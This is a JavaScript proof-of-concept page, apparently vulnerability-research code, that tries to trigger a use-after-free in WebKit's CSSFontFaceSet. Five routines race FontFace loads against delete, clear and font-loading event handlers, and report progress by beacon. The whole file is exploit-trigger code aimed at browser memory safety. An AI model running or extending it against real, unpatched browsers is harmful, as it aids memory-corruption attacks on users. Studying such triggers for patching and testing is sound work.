// p251 — CSSFontFaceSet std::reference_wrapper dangling reference
//
// WebKit-1200 CSSFontFaceSet::matchingFacesExcludingPreinstalledFonts returns
// Vector<std::reference_wrapper<CSSFontFace>> (non-owning references).
// Fix: changed to Ref<CSSFontFace> (strong reference).
//
// Strategy: trigger concurrent font loads + removes to create a window where
// the reference_wrapper outlives the CSSFontFace.
//
// Multiple approaches:
// A) Call document.fonts.load() then immediately delete faces
// B) Use onloadingdone event to remove faces mid-resolution
// C) Race face.load() with delete/clear in tight loop
// D) Use MutationObserver on style changes to intercept font events
//
// Beacon prefix: V251-

(function() {
  function B(tag, body) {
    try { navigator.sendBeacon('/beacon/V251-' + tag + '?t=' + Date.now(), body || ''); } catch(e) {}
  }

  B('BOOT');

  var FAMILY = 'RW251_';
  var NUM_FACES = 30;
  var crashed = false;

  // Build a small valid font that will try to load (and fail) from network
  // Using a URL that returns 404 → async failure → callbacks fire
  function makeFace(idx) {
    return new FontFace(
      FAMILY + idx,
      'url("/font-' + idx + '-' + Math.random().toString(36).slice(2) + '.woff2")',
      { display: 'swap' }
    );
  }

  // ---- Test A: load() then immediate mass-delete ----
  function testA() {
    B('A-START');
    var faces = [];
    try {
      for (var i = 0; i < NUM_FACES; i++) {
        var f = makeFace(i);
        document.fonts.add(f);
        faces.push(f);
      }
      B('A-ADDED-' + faces.length);

      // Start load for all faces with same family
      // This calls matchingFacesExcludingPreinstalledFonts internally
      for (var i = 0; i < NUM_FACES; i++) {
        document.fonts.load('16px "' + FAMILY + i + '"', 'A').catch(function(){});
      }
      B('A-LOADS-STARTED');

      // Immediately delete all faces
      for (var i = 0; i < faces.length; i++) {
        try { document.fonts.delete(faces[i]); } catch(e) {}
      }
      B('A-DELETED-ALL');

    } catch(e) {
      B('A-ERR-' + e.message.substring(0, 40));
    }
  }

  // ---- Test B: onloadingdone + onloadingerror handlers ----
  function testB() {
    B('B-START');
    var faces2 = [];
    var deleteOnEvent = true;

    try {
      // Set up event handlers BEFORE adding faces
      document.fonts.onloadingdone = function(ev) {
        B('B-LOADINGDONE-' + (ev.fontfaces ? ev.fontfaces.length : '?'));
        if (deleteOnEvent) {
          deleteOnEvent = false;
          // Delete all faces during the event handler
          for (var i = 0; i < faces2.length; i++) {
            try { document.fonts.delete(faces2[i]); } catch(e) {}
          }
          B('B-DELETED-IN-HANDLER');
          // Load again to trigger use of stale references
          for (var i = 0; i < 5; i++) {
            document.fonts.load('16px "' + FAMILY + 'B' + i + '"').catch(function(){});
          }
        }
      };

      document.fonts.onloadingerror = function(ev) {
        B('B-LOADINGERROR-' + (ev.fontfaces ? ev.fontfaces.length : '?'));
        if (deleteOnEvent) {
          deleteOnEvent = false;
          for (var i = 0; i < faces2.length; i++) {
            try { document.fonts.delete(faces2[i]); } catch(e) {}
          }
          B('B-DELETED-IN-ERROR-HANDLER');
        }
      };

      for (var i = 0; i < 15; i++) {
        // Use local() sources that fail immediately
        var f = new FontFace(
          FAMILY + 'B' + i,
          'local("NonExistent_B_' + i + '_' + Date.now() + '")',
          { display: 'optional' }
        );
        document.fonts.add(f);
        faces2.push(f);
      }
      B('B-ADDED-' + faces2.length);

      // Trigger load which will fail synchronously for local fonts
      for (var i = 0; i < faces2.length; i++) {
        document.fonts.load('16px "' + FAMILY + 'B' + i + '"', 'X').catch(function(){});
      }
      B('B-LOADS-FIRED');

    } catch(e) {
      B('B-ERR-' + e.message.substring(0, 40));
    }
  }

  // ---- Test C: Tight race — load + delete in microtask ----
  function testC() {
    B('C-START');
    try {
      var ROUNDS = 50;
      for (var r = 0; r < ROUNDS; r++) {
        var f = new FontFace(
          FAMILY + 'C' + r,
          'local("Missing_C_' + r + '")',
          { display: 'optional' }
        );
        document.fonts.add(f);

        // Start load
        var p = f.load();

        // Delete immediately — try to race with internal reference collection
        document.fonts.delete(f);

        // Also call load on the set
        document.fonts.load('16px "' + FAMILY + 'C' + r + '"').catch(function(){});
      }
      B('C-ROUNDS-' + ROUNDS);
    } catch(e) {
      B('C-ERR-' + e.message.substring(0, 40));
    }
  }

  // ---- Test D: clear() during check() ----
  function testD() {
    B('D-START');
    try {
      // Add faces
      for (var i = 0; i < 20; i++) {
        var f = new FontFace(
          FAMILY + 'D' + i,
          'local("Missing_D_' + i + '")',
          { display: 'optional' }
        );
        document.fonts.add(f);
      }
      B('D-ADDED-20');

      // Rapidly interleave check + clear
      for (var round = 0; round < 10; round++) {
        try {
          var ready = document.fonts.check('16px "' + FAMILY + 'D0"');
          B('D-CHECK-' + round + '-' + ready);
        } catch(e) {}
        if (round === 5) {
          document.fonts.clear();
          B('D-CLEARED');
        }
      }
      B('D-DONE');
    } catch(e) {
      B('D-ERR-' + e.message.substring(0, 40));
    }
  }

  // ---- Test E: Stress test — many operations rapidly ----
  function testE() {
    B('E-START');
    try {
      var ITERATIONS = 200;
      for (var i = 0; i < ITERATIONS; i++) {
        var f = new FontFace(
          FAMILY + 'E',
          'local("M_' + i + '")',
          { display: 'optional' }
        );
        document.fonts.add(f);
        f.load().catch(function(){});
        document.fonts.load('16px "' + FAMILY + 'E"').catch(function(){});
        document.fonts.check('16px "' + FAMILY + 'E"');
        document.fonts.delete(f);
      }
      B('E-ITERS-' + ITERATIONS);
    } catch(e) {
      B('E-ERR-' + e.message.substring(0, 40));
    }
  }

  // Run all tests in sequence
  setTimeout(testA, 100);
  setTimeout(testB, 2000);
  setTimeout(testC, 4000);
  setTimeout(testD, 6000);
  setTimeout(testE, 8000);
  setTimeout(function() { B('ALL-DONE'); }, 10000);
})();
